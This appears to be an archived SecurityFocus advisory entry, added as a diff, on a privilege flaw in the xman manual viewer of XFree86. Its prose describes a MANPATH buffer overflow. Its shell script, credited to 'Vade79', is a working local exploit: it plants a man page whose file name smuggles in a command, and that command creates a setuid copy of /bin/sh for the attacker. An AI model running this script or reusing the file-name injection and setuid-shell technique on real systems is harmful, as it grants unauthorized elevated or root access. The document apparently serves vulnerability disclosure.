@@ -1,0 +1,28 @@
+source: http://www.securityfocus.com/bid/3030/info
+
+xman is a component included with the XFree86 Window System.
+
+A buffer overflow in the handling of the MANPATH environment variable by xman makes it possible for a local user to execute arbitrary code. By inserting 70000 characters into the MANPATH variable, it is possible to overwrite stack variables, including the return address. xman is SGID man.
+
+This problem makes it possible for a local user to execute arbitrary code, gaining elevated privileges, and potentially root access. 
+
+#!/bin/sh
+# example of xman exploitation. xman
+# supports privileges.  but, never
+# drops them.
+# Vade79 -> v9@realhalo.org -> realhalo.org.
+MANPATH=~/xmantest/
+mkdir -p ~/xmantest/man1
+cd ~/xmantest/man1
+touch ';runme;.1'
+cat << EOF >~/xmantest/runme
+#!/bin/sh
+cp /bin/sh ~/xmansh
+chown `id -u` ~/xmansh
+chmod 4755 ~/xmansh
+EOF
+chmod 755 ~/xmantest/runme
+echo "click the ';runme;' selection," \
+"exit.  then, check for ~/xmansh."
+xman -bothshown -notopbox
+rm -rf ~/xmantest
